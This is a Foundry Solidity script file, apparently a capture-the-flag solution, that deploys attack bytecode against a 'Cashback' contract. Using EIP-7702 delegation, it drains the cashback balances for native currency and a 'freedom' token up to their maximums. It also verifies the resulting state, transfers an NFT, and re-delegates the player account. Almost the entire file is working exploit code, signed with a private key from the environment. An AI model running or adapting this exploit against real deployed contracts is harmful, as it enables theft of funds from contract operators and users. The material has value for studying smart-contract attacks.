// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {
    ICashbackAttack,
    CashbackAttackDelegate,
    BASIS_POINTS,
    CASHBACK_ADDR,
    NATIVE_MAX_CASHBACK,
    NATIVE_CASHBACK_RATE,
    FREEDOM_ADDR,
    FREEDOM_MAX_CASHBACK,
    FREEDOM_CASHBACK_RATE,
    ATTACK_CREATION_BYTECODE,
    SUPER_NFT_ADDR
} from "./CashbackAttack.sol";
import {Currency, CurrencyLibrary, Cashback} from "./Cashback.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract DeployAttackCode is Script {
    Cashback cashback = Cashback(CASHBACK_ADDR);

    function run() public {
        uint256 sk = vm.envUint("PRIVATE_KEY");

        address payable player = payable(vm.addr(sk));
        uint256 bal = player.balance;
        console.log("player: %s, bal: %s", player, bal);

        vm.startBroadcast(sk);

        // contract creation
        address addr;
        bytes memory creation = ATTACK_CREATION_BYTECODE;
        assembly {
            addr := create(0, add(creation, 0x20), mload(creation))
        }
        require(addr != address(0), "CREATE failed");

        console.log("attack code: %s", addr);

        // Call the attack code
        ICashbackAttack cc = ICashbackAttack(addr);

        // User delegate to CashbackAttackDelegate
        CashbackAttackDelegate delegate = new CashbackAttackDelegate();
        vm.signAndAttachDelegation(address(delegate), sk);

        // native currency
        uint256 currencyId = CurrencyLibrary.NATIVE_CURRENCY.toId();
        address currencyAddr = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
        // get user balance
        uint256 currBal = cashback.balanceOf(player, currencyId);
        uint256 remainingBal = NATIVE_MAX_CASHBACK - currBal;
        uint256 expenseAmt = remainingBal * BASIS_POINTS / NATIVE_CASHBACK_RATE;
        cc.attack(CASHBACK_ADDR, player, currencyAddr, expenseAmt, remainingBal);

        // native currency: check the state
        uint256 cashbackAmt = cashback.balanceOf(player, currencyId);
        require(cashbackAmt == NATIVE_MAX_CASHBACK, "native currency cashback amt not match");

        // freedom token
        currencyId = Currency.wrap(FREEDOM_ADDR).toId();
        currencyAddr = FREEDOM_ADDR;
        // get user balance
        currBal = cashback.balanceOf(player, currencyId);
        remainingBal = FREEDOM_MAX_CASHBACK - currBal;
        expenseAmt = remainingBal * BASIS_POINTS / FREEDOM_CASHBACK_RATE;
        cc.attack(CASHBACK_ADDR, player, currencyAddr, expenseAmt, FREEDOM_MAX_CASHBACK);

        // freedom token: check the state
        cashbackAmt = cashback.balanceOf(player, currencyId);
        require(cashbackAmt == FREEDOM_MAX_CASHBACK, "freedom token cashback amt not match");

        vm.stopBroadcast();
    }
}

contract VerifyScript is Script {
    Cashback cashback = Cashback(CASHBACK_ADDR);

    function run() public view {
        uint256 sk = vm.envUint("PRIVATE_KEY");

        address player = payable(vm.addr(sk));
        uint256 bal = player.balance;
        console.log("player: %s, bal: %s", player, bal);

        // verify user balance
        // native currency: check the state
        uint256 currencyId = CurrencyLibrary.NATIVE_CURRENCY.toId();
        uint256 cashbackAmt = cashback.balanceOf(player, currencyId);
        require(cashbackAmt == NATIVE_MAX_CASHBACK, "native currency cashback amt not match");

        currencyId = Currency.wrap(FREEDOM_ADDR).toId();
        cashbackAmt = cashback.balanceOf(player, currencyId);
        require(cashbackAmt == FREEDOM_MAX_CASHBACK, "freedom token cashback amt not match");

        require(ERC721(SUPER_NFT_ADDR).ownerOf(uint256(uint160(player))) == player, "player should have its own NFT");

        require(ERC721(SUPER_NFT_ADDR).balanceOf(player) >= 2, "Super NFT need to be at least 2");

        require(player.code.length == 23, "user account is delegated");
        console.log("player code:");
        console.logBytes(player.code);
    }
}

contract TransferERC721Script is Script {
    function run() public {
        uint256 sk = vm.envUint("PRIVATE_KEY");

        address player = payable(vm.addr(sk));
        uint256 bal = player.balance;
        console.log("player: %s, bal: %s", player, bal);

        address targetPlayer = 0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7;

        vm.startBroadcast(sk);
        ERC721(SUPER_NFT_ADDR).transferFrom(player, targetPlayer, uint256(uint160(player)));
        vm.stopBroadcast();
    }
}

contract UpdateDelegateScript is Script {
    function run() public {
        uint256 sk = vm.envUint("PRIVATE_KEY");

        address payable player = payable(vm.addr(sk));
        uint256 bal = player.balance;
        console.log("player: %s, bal: %s", player, bal);

        address targetPlayer = 0x9440Abf16a3319E633DA6835d90470ed029D7c0B;

        vm.startBroadcast(sk);

        vm.signAndAttachDelegation(CASHBACK_ADDR, sk);

        require(player.code.length == 23, "user account is delegated");
        console.log("player code:");
        console.logBytes(player.code);

        Cashback(player).payWithCashback(CurrencyLibrary.NATIVE_CURRENCY, targetPlayer, 0.001 ether);

        vm.stopBroadcast();
    }
}
